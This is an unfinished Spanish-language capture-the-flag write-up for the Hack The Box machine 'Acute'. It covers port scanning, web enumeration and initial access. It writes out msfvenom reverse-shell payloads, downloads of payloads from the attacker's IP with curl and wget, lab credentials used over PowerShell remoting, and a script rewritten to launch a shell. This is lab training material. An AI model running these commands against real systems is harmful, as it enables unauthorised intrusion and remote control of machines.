# **Máquina: [Acute]**

![[Pasted image 20250531133316.png]]
## **Información General**

| Machine Info              |         |
| ------------------------- | ------- |
| **IP**                    |         |
| **Dificultad**            | Hard    |
| **Sistema Operativo**     | Windows |
| **Método de Explotación** |         |

---

## **1️ - Escaneo y Enumeración**

### **Escaneo de Puertos**

```zsh
htbscan -n Acute -i 10.10.11.145 -v ~/VPN/lab_4ly3zz.ovpn

[+] Ejecutando escaneo Nmap inicial:
    sudo nmap -sC -sS --min-rate 5000 --open -Pn -oN /home/alien/4ly3nzz/HTB/Acute/enum/scan_Acute 10.10.11.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 08:36 CEST
Nmap scan report for 10.10.11.145
Host is up (0.040s latency).
Not shown: 999 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
443/tcp open  https
|_http-title: Not Found
|_ssl-date: 2025-06-02T06:36:00+00:00; -1s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58

Host script results:
|_clock-skew: -1s

Nmap done: 1 IP address (1 host up) scanned in 5.90 seconds
[+] Escaneo guardado en: /home/alien/4ly3nzz/HTB/Acute/enum/scan_Acute
[*] Extrayendo puertos abiertos del escaneo...
[+] Puertos abiertos detectados: 443
[+] Ejecutando escaneo profundo:
    sudo nmap -sV -p 443 -Pn -oN /home/alien/4ly3nzz/HTB/Acute/enum/deep_scan_Acute 10.10.11.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 08:36 CEST
Nmap scan report for 10.10.11.145
Host is up (0.041s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```

### **Enumeración Web**

![[Pasted image 20250602084104.png]]

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://atsserver.acute.local/FUZZ -mc 200,301 -c
```

Nada interesante.

- Nos descargamos un archivo.

![[Pasted image 20250602090205.png]]

![[Pasted image 20250602101704.png]]


### **Enumeración SMB/NFS/etc.**

---

## **2️ - Explotación Inicial**

### **Identificación de Vulnerabilidades**

Password1!

directorio /acute_staff_access

![[Pasted image 20250602101913.png]]

- El usuario es edavies
### **Explotación del Acceso Inicial**

Shell as edavies

![[Pasted image 20250602102911.png]]

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell.exe
```

```
curl 10.10.14.4/shell.exe -o shell.exe
```

```
python3 -m http.server 80
```

![[Pasted image 20250602104856.png]]

![[Pasted image 20250602104845.png]]

```
curl 10.10.14.4/winPEASany.exe -o winPEASany.exe
```

![[Pasted image 20250602105351.png]]

- Con meterpreter podemos sacar una captura de pantalla

![[Pasted image 20250602111402.png]]

```
ps
```

![[Pasted image 20250602112130.png]]

![[Pasted image 20250602112802.png]]

```
meterpreter > migrate 3640
[*] Migrating from 2696 to 3640...
[*] Migration completed successfully.
meterpreter > 
```

![[1_6wFJf6JqxwmyPhndAI2C_w.webp]]

```powershell
$passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlaintext -Force

$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks",$passwd)

Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred

```

```powershell
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {whoami}
```

```powershell
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {Get-Command}
```

```powershell
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {Get-Alias}
```

```powershell
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {Get-ChildItem -force C:\users\imonks\desktop}
```

```powershell
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {cat C:\users\imonks\desktop\wm.ps1}

PS C:\Utils> Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {cat C:\users\imonks\desktop\wm.ps1}
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {cat C:\users\imonks\desktop\wm.ps1}
$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
PS C:\Utils> 
```

```powershell
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {net user jmorgan}
```

```
net localgroup administrators
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f exe -o sh.exe
```

```
wget http://10.10.14.4/sh.exe -o sh.exe
```

```
rlwrap nc -lvnp 443
```

```
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {((Get-Content C:\Users\imonks\Desktop\wm.ps1 -Raw) -Replace 'Get-Volume','cmd.exe /c C:\Utils\sh.exe') | Set-Content -Path C:\Users\imonks\Desktop\wm.ps1}
```

```
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {cat C:\users\imonks\desktop\wm.ps1}
```

```
Invoke-Command -Computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {C:\users\imonks\desktop\wm.ps1}
```



---

## **3️ - Escalada de Privilegios**

### **Enumeración Post-Explotación**

### **Escalada de Privilegios a Root/System**

---

## **4️ - Obtención de Flags**

| **User Flag** |     |
| ------------- | --- |
| **Root Flag** |     |

---

## **5️ - Notas y Aprendizajes**

### **Errores y Obstáculos**

### **Métodos Alternativos**

### **Herramientas Utilizadas**